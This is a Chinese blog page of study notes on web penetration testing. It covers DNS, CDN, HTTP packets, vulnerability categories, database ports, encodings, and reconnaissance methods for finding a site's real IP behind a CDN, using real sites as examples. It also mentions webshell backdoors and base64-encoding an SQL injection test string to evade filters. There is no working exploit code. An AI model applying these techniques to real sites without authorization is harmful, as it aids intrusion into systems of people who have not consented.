<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="蔚蓝星">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="蔚蓝星">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="花少">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>蔚蓝星</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">蔚蓝星</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">一个无忧无虑的蓝色星球</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/07/xiao-di/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/dongman2.jpg">
      <meta itemprop="name" content="花少">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="蔚蓝星">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/07/xiao-di/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-09-07 11:29:37 / 修改时间：12:21:22" itemprop="dateCreated datePublished" datetime="2023-09-07T11:29:37+08:00">2023-09-07</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
           <span id="more"></span>

<h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><p><strong>网域名称</strong>（英语：Domain Name，简称：Domain），简称<strong>域名</strong>、<strong>网域</strong>，是由一串用点分隔的字符组成的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91">互联网</a>上某一台<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E5%AD%90%E8%A8%88%E7%AE%97%E6%A9%9F">计算机</a>或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名可以说是一个<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80">IP地址</a>的代称，目的是为了便于记忆后者。例如，<code>wikipedia.org</code>是一个域名。人们可以直接访问<code>wikipedia.org</code>来代替IP地址，然后<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F">域名系统</a>（DNS）就会将它转化成便于机器识别的IP地址。</p>
<p>(维基百科)</p>
<p>主站没有突破口，可以通过另一个域名（由于解析IP是相同的），找到漏洞，从而获得主站权限</p>
<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>主要用于域名和IP地址的相互转换.</p>
<ul>
<li>域名系统（<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem）。它是一个域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</li>
</ul>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230629151252406.png" alt="image-20230629151252406"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230629151406375.png" alt="image-20230629151406375"></p>
<p>按照设置的DNS服务器来解析，未设置就向上</p>
<p>host文件重定向这个IP,先看看host里面的域名能不能找到这个IP</p>
<p>可以修改host文件来指向我们想要的IP,比如steam下载，加速器用国内服务器下载</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230629151536534.png" alt="image-20230629151536534"></p>
<h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230629152128979.png" alt="image-20230629152128979"></p>
<p>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E9%80%9F%E5%BA%A6/488203?fromModule=lemma_inlink">数据传输速度</a>和稳定性的瓶颈和环节，使内容传输得更快、更稳定。通过在网络各处放置<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%8A%82%E7%82%B9%E6%9C%8D%E5%8A%A1%E5%99%A8/4576219?fromModule=lemma_inlink">节点服务器</a>所构成的在现有的互联网基础之上的一层智能<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C/855117?fromModule=lemma_inlink">虚拟网络</a>，CDN系统能够实时地根据<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F/7489548?fromModule=lemma_inlink">网络流量</a>和各节点的连接、负载状况以及到用户的距离和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4/1528464?fromModule=lemma_inlink">响应时间</a>等综合信息将用户的请求重新导向离用户最近的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E8%8A%82%E7%82%B9/55443463?fromModule=lemma_inlink">服务节点</a>上。其目的是使用户可就近取得所需内容，解决 Internet<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%8B%A5%E6%8C%A4/10004398?fromModule=lemma_inlink">网络拥挤</a>的状况，提高用户访问网站的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%93%8D%E5%BA%94%E9%80%9F%E5%BA%A6/10585537?fromModule=lemma_inlink">响应速度</a>。（百度百科）</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230629152544777.png" alt="image-20230629152544777"></p>
<p><strong>常见的 DNS 安全攻击有哪些？</strong></p>
<ul>
<li>缓存投毒：它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。</li>
<li>DNS劫持：是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。（针对面较广）</li>
<li>域名劫持：域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。（针对面窄一点）</li>
<li>DNS DDOS攻击：通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求</li>
</ul>
<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><p>网站后门:websehll</p>
<p>服务器后门：很多种</p>
<p>为了方便再次获得权限，并且控制</p>
<p>有各种各样的玩法，免杀</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="组成架构模型"><a href="#组成架构模型" class="headerlink" title="组成架构模型"></a>组成架构模型</h2><p>*网站源码：分脚本类型，分应用方向</p>
<p>*操作系统</p>
<p>*搭建平台（中间件）：apache,iis,tomcat,nginx等</p>
<p>*数据库</p>
<p>以后的漏洞可以讲讲是在哪个层面</p>
<h2 id="WEB-相关安全漏洞"><a href="#WEB-相关安全漏洞" class="headerlink" title="WEB 相关安全漏洞"></a>WEB 相关安全漏洞</h2><ul>
<li><p>WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</p>
</li>
<li><p>WEB 中间件对应漏洞：未授权访问，变量覆盖…</p>
</li>
<li><p>WEB 数据库对应漏洞：弱口令，权限提升…</p>
</li>
<li><p>WEB 系统层对应漏洞：提权，远程代码执行</p>
</li>
<li><p>其他第三方对应漏洞</p>
</li>
<li><p>APP 或 PC 应用结合类:app封装</p>
</li>
</ul>
<h2 id="为什么要从-WEB-层面为主为首？"><a href="#为什么要从-WEB-层面为主为首？" class="headerlink" title="为什么要从 WEB 层面为主为首？"></a><strong>为什么要从 WEB 层面为主为首？</strong></h2><ul>
<li>web使用的比较广</li>
<li>web网站了漏洞相对较多</li>
<li>web 作为跳板深入到其他资源相对容易</li>
</ul>
<h1 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h1><ul>
<li><p>HTTP:HTTP协议运行在TCP之上，所有传输的内容都是明文,用的80端口</p>
</li>
<li><p>HTTPS:HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费,HTTPS运行在SSL&#x2F;TLS之上,SSL&#x2F;TLS运行在TCP之上，所有传输的内容都经过加密的，用的443端口。</p>
</li>
<li><p><strong>Request Headers</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>

<p><strong>Form Data</strong></p>
<ul>
<li>name&#x3D;name&amp;age&#x3D;11</li>
</ul>
<p><strong>请求行</strong></p>
<ul>
<li>请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。</li>
<li>例如：GET &#x2F;index.html HTTP&#x2F;1.1</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP 规划定义了 8 种可能的请求方法：</span><br><span class="line">GET：检索 URL 中标识资源的一个简单请求</span><br><span class="line">HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">POST：服务器接受被写入客户端输出流中的数据的请求</span><br><span class="line">PUT：服务器保存请求数据作为指定 URL 新内容的请求</span><br><span class="line">DELETE：服务器删除 URL 中命令的资源的请求</span><br><span class="line">OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">TRACE：web 服务器反馈 Http 请求和其头标的请求</span><br><span class="line">CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br></pre></td></tr></table></figure>

<p><strong>请求头</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</span><br><span class="line">HOST: 主机或域名地址</span><br><span class="line">Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格</span><br><span class="line">式。</span><br><span class="line">User-Agent：是客户浏览器名称</span><br><span class="line">Host：对应网址 URL 中的 Web 名称和端口号。</span><br><span class="line">Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。</span><br><span class="line">connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive</span><br><span class="line">为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立</span><br><span class="line">连接</span><br><span class="line">Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载</span><br><span class="line">和服务器相关的用户信息，也可以用来实现会话功能。</span><br><span class="line">Referer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 /icconcept/index.jsp 中 点 击 一 个 链 接 到 网 页</span><br><span class="line">/icwork/search ， 在 向 服 务 器 发 送 的 GET/icwork/search 中 的 请 求 中 ， Referer 是</span><br><span class="line">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。</span><br><span class="line">Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。</span><br><span class="line">Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.</span><br><span class="line">Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加</span><br><span class="line">速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</span><br></pre></td></tr></table></figure>

<p><strong>空行</strong></p>
<ul>
<li>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</li>
</ul>
<p><strong>请求数据</strong></p>
<ul>
<li>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</li>
</ul>
</li>
</ul>
<h1 id="搭建安全拓展"><a href="#搭建安全拓展" class="headerlink" title="搭建安全拓展"></a>搭建安全拓展</h1><p>iis安装</p>
<p>域名扫描指向某个目录，ip扫描是根目录</p>
<p>vulhub环境搭建</p>
<h1 id="WEB-源码拓展"><a href="#WEB-源码拓展" class="headerlink" title="WEB 源码拓展"></a>WEB 源码拓展</h1><blockquote>
<p>WEB 源码在安全测试中是非常重要的信息来源，可以用来<strong>代码审计</strong>漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。</p>
</blockquote>
<ul>
<li>敏感目录结构：数据库配置文件，后台目录，模版目录，数据库目录等</li>
<li>web脚本类型：ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码</li>
<li>应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</li>
<li>开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</li>
<li>关于源码获取的相关途径：搜索，咸鱼淘宝，第三方源码站</li>
</ul>
<blockquote>
<p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。</p>
</blockquote>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhGN91ibYoovfSZZoWuePib31lSfGYqFYNibFCQG84oojdpWmw2IOpY8iaFQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>尽量弄到源码，知道cms可以弄源码</p>
<h1 id="系统及其数据库"><a href="#系统及其数据库" class="headerlink" title="系统及其数据库"></a>系统及其数据库</h1><p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMh589OLMPMMe11qibaZ25ibyfO1xrpHkgRoFwIXGUBziambs7JzA2HOZaWw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>linux对大小写敏感</p>
<h2 id="常见数据库对应的默认端口"><a href="#常见数据库对应的默认端口" class="headerlink" title="常见数据库对应的默认端口"></a>常见数据库对应的默认端口</h2><p>关系型数据库： </p>
<p>1.Oracle数据库默认端口号为，1521； </p>
<p>2.MySQL数据库默认端口号为，3306； </p>
<p>3.SQLServer数据库默认端口号为，1433;</p>
<p>NOSQL数据库： </p>
<p>1.MongoDB默认端口号为：27017； </p>
<p>2.Redis默认端口号为：6379； </p>
<p>3.memcached默认端口号为：11211；</p>
<p>其他：</p>
<p>1527　　Derby</p>
<p>5432　　pgsql</p>
<p>5000　　db2</p>
<p>9092　　pointbase</p>
<p>无默认　Informix</p>
<h2 id="查看数据库端口"><a href="#查看数据库端口" class="headerlink" title="查看数据库端口"></a>查看数据库端口</h2><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807110526544.png" alt="image-20230807110526544"></p>
<p>围绕者四个方面，怎么找，怎么利用</p>
<h1 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h1><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807144208314.png" alt="image-20230807144208314"></p>
<h1 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h1><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>浏览器一次编码，关键词绕过二次编码</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807144348775.png" alt="image-20230807144348775"></p>
<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>区分大小写，长度随机，随着明文长度增加而增加，经常会出现两个&#x3D;。</p>
<h2 id="Unescape"><a href="#Unescape" class="headerlink" title="Unescape"></a>Unescape</h2><p>%u+数字，对应2个字，后面4个0，偶数倒数2个零</p>
<h2 id="aes"><a href="#aes" class="headerlink" title="aes"></a>aes</h2><p>密码，偏移量，填充，数据块。常常出现&#x2F;,&#x3D;</p>
<h2 id="des"><a href="#des" class="headerlink" title="des"></a>des</h2><p>常常出现+</p>
<p>asc(php ord( ))</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807150829013.png" alt="image-20230807150829013"></p>
<p>写解密算法</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807150915679.png" alt="image-20230807150915679"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807151043629.png" alt="image-20230807151043629"></p>
<h2 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h2><p>md5+salt</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807151758886.png" alt="image-20230807151758886"></p>
<h2 id="aes解密"><a href="#aes解密" class="headerlink" title="aes解密"></a>aes解密</h2><p>可以看到加密模式和填充块</p>
<p>及其密码和偏移量</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807154717142.png" alt="image-20230807154717142"></p>
<h2 id="sql注入解密"><a href="#sql注入解密" class="headerlink" title="sql注入解密"></a>sql注入解密</h2><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807155228112.png" alt="image-20230807155228112"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230807155253032.png" alt="image-20230807155253032"></p>
<p>直接将后面 and 1&#x3D;1进行base64加密</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="判断是否有CDN"><a href="#判断是否有CDN" class="headerlink" title="判断是否有CDN"></a>判断是否有CDN</h2><p><strong>看响应时间</strong>工具：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/speedtest">http://tool.chinaz.com/speedtest</a></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhH05UceXUR6BDib67MVACrfppNCvZv3W385hjlLyvaKyGcXMM8giaT6QA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>ping ip或域名，看是否会出现变化****无</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhgXDeic6FtDyJ6d18coGZ50DlxAd7T4qBkpRibibtAQuOhGcwYUZRaD14g/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>有</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhUrH7VYJH1AL0vGvvM7icJP4nZDRYSn8l75KQQ0JDgiak1Gy6MjlUgLiag/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>nslookup 域名，看是否会有很多节点</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhYjnS3TKgZ9yh1Jic5xJXNjeGwvOyo5x9ZneoxwQ2oyLwj5GSibKMGtMQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><p>WWW</p>
<p>✧ 利用子域名请求获取真实IP</p>
<p>✧ 利用国外地址请求获取真实IP  <a target="_blank" rel="noopener" href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p>
<p>✧ 利用第三方接口查询获取真实IP</p>
<p>✧ 利用邮件服务器接口获取真实IP</p>
<p>✧ 利用黑暗引擎搜索特定文件获取真实IP</p>
<p><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
<p>没做CDN可以ping出真实IP</p>
<h2 id="子域名上面的小技巧"><a href="#子域名上面的小技巧" class="headerlink" title="子域名上面的小技巧"></a>子域名上面的小技巧</h2><p><a target="_blank" rel="noopener" href="http://www.xueersi.com做了cdn,但是xueersi.com没做cdn,可以获取到真实ip/">www.xueersi.com做了cdn，但是xueersi.com没做cdn，可以获取到真实ip</a></p>
<p>虽然网站内容一样，但是在解析上会不同</p>
<p>sp910.comDNS历史记录&#x3D;第三方接口（接口查询）</p>
<p>m.sp910.com 子域名小技巧&#x2F;采集&#x2F;国外请求（同类型访问）</p>
<p>mozhe 邮件源码测试对比第三方查询（地区分析,备案号;hosts文件确定）</p>
<p>v23gg 黑暗引擎（shodan搜指定hash文件）：</p>
<p>python2脚本获取hash值并搜索</p>
<p>扫全网</p>
<p>fuckcdn，w8fuckcdn，zmap等</p>
<p>fuckcdn演示</p>
<p>目录型站点</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230808114544286.png" alt="image-20230808114544286"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMh8GDia9kWOT2QrR34BFrqs54ibv9xfs8xZlDIF3ZCo9WibnXajCKM8rwog/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="CMS识别技术"><a href="#CMS识别技术" class="headerlink" title="CMS识别技术"></a>CMS识别技术</h2><h2 id="源码获取技术"><a href="#源码获取技术" class="headerlink" title="源码获取技术"></a>源码获取技术</h2><h2 id="架构信息获取"><a href="#架构信息获取" class="headerlink" title="架构信息获取"></a>架构信息获取</h2><h2 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h2><h3 id="1-搭建习惯-目录型站点"><a href="#1-搭建习惯-目录型站点" class="headerlink" title="1.搭建习惯-目录型站点"></a>1.搭建习惯-目录型站点</h3><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810084535841.png" alt="image-20230810084535841"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810084546862.png" alt="image-20230810084546862"></p>
<p>一个网站，两套程序，两个漏洞点。</p>
<h3 id="2-搭建习惯-端口类站点"><a href="#2-搭建习惯-端口类站点" class="headerlink" title="2.搭建习惯-端口类站点"></a>2.搭建习惯-端口类站点</h3><p>常规网站时80端口</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810090926869.png" alt="image-20230810090926869"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810090941308.png" alt="image-20230810090941308"></p>
<p>（内网可以多台服务器映射一个端口）</p>
<h3 id="3-搭建习惯-子域名站点"><a href="#3-搭建习惯-子域名站点" class="headerlink" title="3.搭建习惯-子域名站点"></a>3.搭建习惯-子域名站点</h3><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810094506293.png" alt="image-20230810094506293"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810094536123.png" alt="image-20230810094536123"></p>
<p>这两个网站可能不在同一个网站</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810095550880.png" alt="image-20230810095550880"></p>
<p>学思路，这个可以看到有些网站是通过web或者没有通过web</p>
<h3 id="4-搭建习惯-类似域名站点"><a href="#4-搭建习惯-类似域名站点" class="headerlink" title="4.搭建习惯-类似域名站点"></a>4.搭建习惯-类似域名站点</h3><p>有些有域名，有些没域名</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810100126780.png" alt="image-20230810100126780"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810100208551.png" alt="image-20230810100208551"></p>
<p>常用于src漏洞挖掘</p>
